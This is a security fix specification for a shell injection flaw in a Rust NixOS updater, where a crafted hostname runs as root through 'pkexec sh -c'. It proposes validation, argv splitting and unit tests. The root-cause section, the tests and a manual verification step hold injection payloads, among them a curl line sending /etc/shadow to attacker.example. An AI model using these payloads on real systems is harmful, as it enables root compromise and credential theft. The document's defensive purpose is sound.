# Security Fix: Shell Injection via Unvalidated Hostname in NixOS Flake Update

**Type:** Security — HIGH severity  
**Finding:** Shell Injection via Unvalidated Hostname  
**Spec Author:** Research & Specification Agent  
**Date:** 2026-03-18  
**Status:** Ready for Implementation

---

## 1. Current State Analysis

### 1.1 Files Involved

| File | Role | Vulnerability |
|---|---|---|
| `src/backends/nix.rs` | NixBackend — `run_update()` for flake-based NixOS | **PRIMARY — shell injection in `pkexec sh -c`** |
| `src/upgrade.rs` | Upgrade orchestration — `detect_hostname()` utility | Secondary — unvalidated read used in UI |
| `src/ui/upgrade_page.rs` | GTK4 Config Type row display | Secondary — hostname used as Pango subtitle (markup injection risk) |

---

### 1.2 Vulnerable Code — `src/backends/nix.rs`

**`nixos_hostname()` (lines 18–23) — raw read, no validation:**

```rust
fn nixos_hostname() -> String {
    std::fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_else(|_| "nixos".to_owned())
        .trim()
        .to_string()
}
```

**`run_update()` flake branch (lines 50–64) — verbatim interpolation into shell command:**

```rust
let hostname = nixos_hostname();
let cmd = format!(
    "export PATH=/run/current-system/sw/bin:/run/wrappers/bin:/nix/var/nix/profiles/default/bin:$PATH && cd /etc/nixos && nix flake update && nixos-rebuild switch --flake /etc/nixos#{}",
    hostname
);
match runner.run("pkexec", &["sh", "-c", &cmd]).await {
```

**Shell invocation:**

```rust
runner.run("pkexec", &["sh", "-c", &cmd]).await
```

`pkexec` elevates privilege to root; `sh -c` then executes the full string with shell interpretation.

---

### 1.3 Duplicate in `src/upgrade.rs` (lines 38–42)

```rust
pub fn detect_hostname() -> String {
    std::fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_else(|_| "nixos".to_owned())
        .trim()
        .to_string()
}
```

This is a second copy of the same unvalidated hostname read. It is called by `upgrade_page.rs` for UI display only (no shell execution). **Risk level is lower but not zero** — see section 4.

---

### 1.4 UI Display in `src/ui/upgrade_page.rs` (lines 69–75)

```rust
let config_type = upgrade::detect_nixos_config_type();
let config_label: String = match config_type {
    upgrade::NixOsConfigType::Flake => {
        let hostname = upgrade::detect_hostname();
        format!("Flake-based (/etc/nixos#{})", hostname)
    }
```

This string is passed to `adw::ActionRow::set_subtitle()`. libadwaita `ActionRow` subtitles render Pango markup. A hostname containing `<b>`, `&amp;`, or other Pango sequences could cause UI corruption or markup injection. A hostname containing `<`, `>`, or `&` maps directly to Pango markup metacharacters.

---

## 2. Root Cause

The root cause is a **classic injection vulnerability pattern**:

1. **Untrusted input enters the system:** `/proc/sys/kernel/hostname` can be set to any string by any process with `CAP_SYS_ADMIN` — on many systems that includes the unprivileged user themselves via `hostname mymaliciousname`.

2. **No validation before use:** The raw string is `.trim().to_string()` — stripped of whitespace only.

3. **Interpolated verbatim into a shell command string:** The `format!("... #{}", hostname)` call constructs a single string.

4. **That string is passed to `sh -c` running as root via `pkexec`:** `/bin/sh` interprets the full string including any metacharacters embedded in `hostname`.

A hostname such as:

```
nixos; curl http://attacker.example/ -d "$(cat /etc/shadow)" #
```

Produces the shell command:

```sh
export PATH=... && cd /etc/nixos && nix flake update && nixos-rebuild switch --flake /etc/nixos#nixos; curl http://attacker.example/ -d "$(cat /etc/shadow)" #
```

`sh` executes this as root, exfiltrating `/etc/shadow` to a remote server. No user interaction beyond triggering the update is required.

---

## 3. Confirmation: Genuine Vulnerability

**This is a genuine HIGH-severity security bug, not a false positive.**

Evidence:
- The Linux kernel allows setting hostname to arbitrary strings up to 64 bytes (POSIX `HOST_NAME_MAX`); there is no OS-level restriction preventing shell metacharacters in the hostname kernel buffer.
- `pkexec sh -c "<string>"` is semantically equivalent to `sudo sh -c "<string>"` — the shell interprets the full string as a script.
- The `format!()` interpolation provides no escaping.
- The `.trim()` call strips only `\n`, `\r`, `\t`, and space — none of which are needed for exploit; `;`, `$`, backtick, `(`, `)`, `&` all pass through unchanged.
- The whole path (read → format → pkexec sh) executes within a single `run_update()` invocation; no additional privileges, user confirmation, or network access are required beyond the normal "update" button press in the GUI.

**CVSS 3.1 rough estimate:** AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H → ~7.3 (High)

The LOCAL attack vector is accurate because the attacker must be able to set the kernel hostname; on a single-user desktop, the operator IS the attacker. However, shared machines or kiosk installations are directly exposed to privilege escalation.

---

## 4. Ripple Effects — All Affected Locations

| Location | Line(s) | Risk | Action Required |
|---|---|---|---|
| `src/backends/nix.rs` — `nixos_hostname()` | 18–23 | **CRITICAL** — shell injection | Replace with validated read |
| `src/backends/nix.rs` — `run_update()` flake branch | 50–64 | **CRITICAL** — `pkexec sh -c` | Eliminate `sh -c`, split into two `runner.run()` calls |
| `src/upgrade.rs` — `detect_hostname()` | 38–42 | Medium — Pango markup injection | Add validation before returning; return fallback on failure |
| `src/ui/upgrade_page.rs` — config label construction | 69–75 | Medium — Pango markup injection | Validate hostname before use; show safe fallback on failure |

The two medium-risk locations do **not** execute shell commands and are therefore not directly exploitable for privilege escalation. However, the same hostname value that causes shell injection would also cause Pango markup injection, which can crash or corrupt the UI. Defense-in-depth requires fixing both locations.

---

## 5. Proposed Fix Architecture

### 5.1 Why `sh -c` Can Be Eliminated

The current single-shell command does three things:

```sh
export PATH=... && cd /etc/nixos && nix flake update && nixos-rebuild switch --flake /etc/nixos#<hostname>
```

Each of these maps directly to a capability in Rust's `Command` API or can be replaced with an equivalent argument:

| Shell construct | `sh -c` required? | Rust alternative |
|---|---|---|
| `export PATH=...` | No | Pass `env` program with PATH as argument to `pkexec` |
| `cd /etc/nixos` | No | Pass `/etc/nixos` as explicit path to `nix flake update` |
| `nix flake update` | No | First `runner.run()` call |
| `nixos-rebuild switch --flake /etc/nixos#...` | No | Second `runner.run()` call, hostname as one argument |

**Conclusion: `sh -c` is entirely unnecessary and must be removed.**

---

### 5.2 Step-by-Step Fix

#### Step A: Add `validate_hostname()` to `src/backends/nix.rs`

A NixOS flake output attribute name (the part after `#`) is a Nix identifier. Conservative allowlist:

- Characters: `[A-Za-z0-9_-]` only (alphanumeric, underscore, hyphen)
- Length: 1–63 characters (a single DNS label max length; NixOS hostnames are never FQDNs as flake attributes)
- Must not be empty

No regular expression crate is needed — a simple iterator check suffices:

```rust
/// Validates that a hostname is safe to use as a NixOS flake output attribute.
/// Only ASCII alphanumeric, hyphen, and underscore are permitted.
/// Returns Ok(hostname) on success or Err(message) on failure.
fn validate_hostname(hostname: &str) -> Result<String, String> {
    if hostname.is_empty() {
        return Err("hostname is empty".to_string());
    }
    if hostname.len() > 63 {
        return Err(format!(
            "hostname is too long ({} chars, max 63)",
            hostname.len()
        ));
    }
    if !hostname
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    {
        return Err(format!(
            "hostname contains disallowed characters (only A-Z, a-z, 0-9, '-', '_' are permitted): {:?}",
            hostname
        ));
    }
    Ok(hostname.to_string())
}
```

> **No new crate required.** Standard library `str::chars()` and `char::is_ascii_alphanumeric()` are sufficient.

#### Step B: Rewrite `nixos_hostname()` to use `validate_hostname()`

```rust
fn nixos_hostname() -> Result<String, String> {
    let raw = std::fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_else(|_| "nixos".to_owned());
    let trimmed = raw.trim();
    validate_hostname(trimmed)
}
```

This changes the return type from `String` to `Result<String, String>`, so call sites must be updated.

#### Step C: Split `sh -c` into Two Discrete `runner.run()` Calls

The PATH requirement is handled by prefixing `pkexec` with `env PATH=<value>`. `env` is available at `/usr/bin/env` on all Linux systems; pkexec resolves it normally.

The `nix flake update` command accepts an explicit flake path as a positional argument (Nix ≥ 2.4 with `nix-command` experimental feature enabled, which is required for flake support anyway). This eliminates the need for a `cd`.

```rust
const NIX_PATH: &str =
    "/run/current-system/sw/bin:/run/wrappers/bin:/nix/var/nix/profiles/default/bin:/usr/bin:/bin";

// Step 1: Update flake inputs (no hostname needed, no shell).
runner.run(
    "pkexec",
    &["env", &format!("PATH={NIX_PATH}"), "nix", "flake", "update", "/etc/nixos"],
).await?

// Step 2: Rebuild — hostname is a single argument, NOT interpolated into a shell string.
let flake_ref = format!("/etc/nixos#{validated_hostname}");
runner.run(
    "pkexec",
    &["env", &format!("PATH={NIX_PATH}"), "nixos-rebuild", "switch", "--flake", &flake_ref],
).await?
```

**Key security property:** In `Command::new("pkexec").args([..., "nixos-rebuild", ..., &flake_ref])`, each element of the `args` slice becomes a **separate `argv` entry**. The shell is never involved. Even if `validated_hostname` somehow contained `; rm -rf /`, it would be passed as a literal string to `nixos-rebuild` (which would reject it as an unknown flake attribute), not executed by any shell.

#### Step D: Update `run_update()` to Propagate Validation Errors

```rust
async fn run_update(&self, runner: &CommandRunner) -> UpdateResult {
    if is_nixos() {
        if is_nixos_flake() {
            let hostname = match nixos_hostname() {
                Ok(h) => h,
                Err(e) => return UpdateResult::Error(format!("Invalid NixOS hostname: {e}")),
            };
            // ... two runner.run() calls as in Step C ...
        }
    }
}
```

#### Step E: Fix `upgrade.rs::detect_hostname()` (Defense-in-Depth)

Change the return type to `Option<String>` and validate before returning:

```rust
pub fn detect_hostname() -> Option<String> {
    let raw = std::fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_else(|_| "nixos".to_owned());
    let trimmed = raw.trim();
    // Only return the hostname if it is safe for display and use.
    if trimmed.is_empty()
        || trimmed.len() > 63
        || !trimmed.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    {
        None
    } else {
        Some(trimmed.to_string())
    }
}
```

#### Step F: Fix `upgrade_page.rs` to Handle `Option<String>` from `detect_hostname()`

```rust
let config_label: String = match config_type {
    upgrade::NixOsConfigType::Flake => {
        match upgrade::detect_hostname() {
            Some(hostname) => format!("Flake-based (/etc/nixos#{})", hostname),
            None => "Flake-based (/etc/nixos — hostname unavailable)".to_string(),
        }
    }
    upgrade::NixOsConfigType::LegacyChannel => {
        "Channel-based (/etc/nixos/configuration.nix)".to_string()
    }
};
```

---

### 5.3 PATH Handling Without `$PATH` Expansion

The original command used `$PATH` to append existing PATH entries:

```sh
export PATH=/run/current-system/sw/bin:...:$PATH
```

Since `pkexec` already resets PATH before executing, `$PATH` in that context expands to pkexec's minimal PATH, not the user's PATH. The original `$PATH` append was effectively a no-op for security purposes. The fixed version uses a **hardcoded, explicit PATH** with no shell expansion. This is more deterministic and more secure — no unexpected binaries shadow the Nix tools.

The `NIX_PATH` constant in Step C above includes:
- `/run/current-system/sw/bin` — NixOS system programs
- `/run/wrappers/bin` — setuid wrapper programs (needed by pkexec itself)
- `/nix/var/nix/profiles/default/bin` — Nix daemon/CLI
- `/usr/bin:/bin` — FHS fallback for standard tools

---

## 6. No New Dependencies Required

This fix requires **zero new crates**:

- `validate_hostname()` uses only `str::chars()`, `char::is_ascii_alphanumeric()`, and `str::len()` — all in the Rust standard library.
- The `format!()` macro for `flake_ref` is already used throughout the codebase.
- `Command::new()` / `runner.run()` are already in use.

The existing `Cargo.toml` is unchanged.

---

## 7. Test Verification

### 7.1 Unit Tests (add to `src/backends/nix.rs`)

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_hostname_accepts_valid() {
        assert!(validate_hostname("nixos").is_ok());
        assert!(validate_hostname("my-pc").is_ok());
        assert!(validate_hostname("workstation_01").is_ok());
        assert!(validate_hostname("a").is_ok()); // minimum length
        assert!(validate_hostname(&"a".repeat(63)).is_ok()); // maximum length
    }

    #[test]
    fn test_validate_hostname_rejects_shell_metacharacters() {
        // The exact attack vector from the security finding
        assert!(validate_hostname("nixos; curl attacker.example -d \"$(cat /etc/shadow)\"").is_err());
        assert!(validate_hostname("nixos; id > /tmp/pwned").is_err());
        assert!(validate_hostname("host`id`").is_err());
        assert!(validate_hostname("host$(id)").is_err());
        assert!(validate_hostname("host && evil").is_err());
        assert!(validate_hostname("host | evil").is_err());
    }

    #[test]
    fn test_validate_hostname_rejects_empty_and_oversized() {
        assert!(validate_hostname("").is_err());
        assert!(validate_hostname(&"a".repeat(64)).is_err()); // 64 chars > max 63
    }

    #[test]
    fn test_validate_hostname_rejects_pango_markup_chars() {
        assert!(validate_hostname("<b>bold</b>").is_err());
        assert!(validate_hostname("host&entity").is_err());
        assert!(validate_hostname("foo.bar").is_err()); // dots not permitted
    }
}
```

### 7.2 Manual Verification

On a NixOS test machine or VM:

```bash
# 1. Set the hostname to contain shell metacharacters
sudo hostname 'nixos; id > /tmp/pwned'

# 2. Launch Up (the patched version)
# 3. Navigate to the Updates tab and click "Update All"
# 4. Expected result (patched):
#    - Update log shows: "Invalid NixOS hostname: hostname contains disallowed characters"
#    - /tmp/pwned does NOT exist
#
# 5. Expected result (unpatched):
#    - /tmp/pwned DOES exist and contains output of `id` run as root
```

### 7.3 Regression Test — Valid Hostname Still Works

```bash
sudo hostname 'myhostname'
# Run Up → expect nix flake update + nixos-rebuild switch --flake /etc/nixos#myhostname
# to execute successfully (no regression in normal flow)
```

---

## 8. Code Sketch — Corrected `run_update()` Flake Branch

The following is a structural sketch demonstrating the complete fix. The actual implementation must compile against the project's types and match the error-handling style used elsewhere in `nix.rs`.

```rust
const NIX_PATH: &str =
    "/run/current-system/sw/bin:/run/wrappers/bin:/nix/var/nix/profiles/default/bin:/usr/bin:/bin";

async fn run_update(&self, runner: &CommandRunner) -> UpdateResult {
    if is_nixos() {
        if is_nixos_flake() {
            // --- SECURITY FIX: validate hostname before any use ---
            let hostname = match nixos_hostname() {
                Ok(h) => h,
                Err(e) => return UpdateResult::Error(format!("Invalid NixOS hostname: {e}")),
            };

            // Step 1: Update flake inputs.
            // No shell involved — each argument is a discrete argv entry.
            // PATH is set via `env` because pkexec resets PATH.
            let path_arg = format!("PATH={NIX_PATH}");
            let update_result = runner
                .run(
                    "pkexec",
                    &["env", &path_arg, "nix", "flake", "update", "/etc/nixos"],
                )
                .await;
            if let Err(e) = update_result {
                return UpdateResult::Error(e);
            }

            // Step 2: Apply the updated inputs.
            // hostname is passed as a single argument to nixos-rebuild —
            // even if it somehow contained metacharacters they would be
            // treated as literal bytes by the kernel execve(), not by sh.
            let flake_ref = format!("/etc/nixos#{hostname}");
            match runner
                .run(
                    "pkexec",
                    &[
                        "env",
                        &path_arg,
                        "nixos-rebuild",
                        "switch",
                        "--flake",
                        &flake_ref,
                    ],
                )
                .await
            {
                Ok(output) => UpdateResult::Success {
                    updated_count: output.lines().filter(|l| !l.is_empty()).count(),
                },
                Err(e) => UpdateResult::Error(e),
            }
        } else {
            // Legacy channel path — unchanged, already safe.
            match runner
                .run("pkexec", &["nixos-rebuild", "switch", "--upgrade"])
                .await
            {
                Ok(output) => UpdateResult::Success {
                    updated_count: output.lines().filter(|l| !l.is_empty()).count(),
                },
                Err(e) => UpdateResult::Error(e),
            }
        }
    } else {
        // Non-NixOS nix profile path — unchanged, already safe.
        // ... existing nix profile update logic ...
    }
}
```

---

## 9. Implementation Checklist

- [ ] Add `validate_hostname(hostname: &str) -> Result<String, String>` to `src/backends/nix.rs`
- [ ] Change `nixos_hostname()` return type to `Result<String, String>` and call `validate_hostname()`
- [ ] Add `NIX_PATH` constant to `src/backends/nix.rs`
- [ ] Replace the `pkexec sh -c <cmd>` single call with two `runner.run("pkexec", ...)` calls (flake update + nixos-rebuild)
- [ ] Return `UpdateResult::Error(...)` immediately when hostname validation fails
- [ ] Change `detect_hostname()` in `src/upgrade.rs` to return `Option<String>` with inline validation
- [ ] Update call site in `src/ui/upgrade_page.rs` to handle `Option<String>` from `detect_hostname()`
- [ ] Add unit tests in `src/backends/nix.rs` under `#[cfg(test)]`
- [ ] Run `cargo test`, `cargo clippy -- -D warnings`, `cargo fmt --check`

---

## 10. Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| `pkexec env` pkexec policy may reject `/usr/bin/env` | Low — standard Linux systems allow this | Update fails; no security regression | Test on target NixOS before release |
| `nix flake update /etc/nixos` positional path argument not supported on old Nix | Low — Nix 2.4+ (2021) required for flakes, this syntax has been stable since then | Fallback needed for `nix flake update` | Document minimum Nix version; `nix flake update` without path falls back to cwd (acceptable) |
| Hostname validation too strict (e.g., valid hostnames with dots) | Low — NixOS `nixosConfigurations` attribute names never use dots | User sees "invalid hostname" error with help message | The error message in `UpdateResult::Error` explains the constraint; user can manually set a conforming hostname |
| `detect_hostname()` returning `Option<String>` breaks other callers | None identified — only one call site in `upgrade_page.rs` | Compile error caught at build time | Fix the one call site as part of this change |

---

*End of Specification*
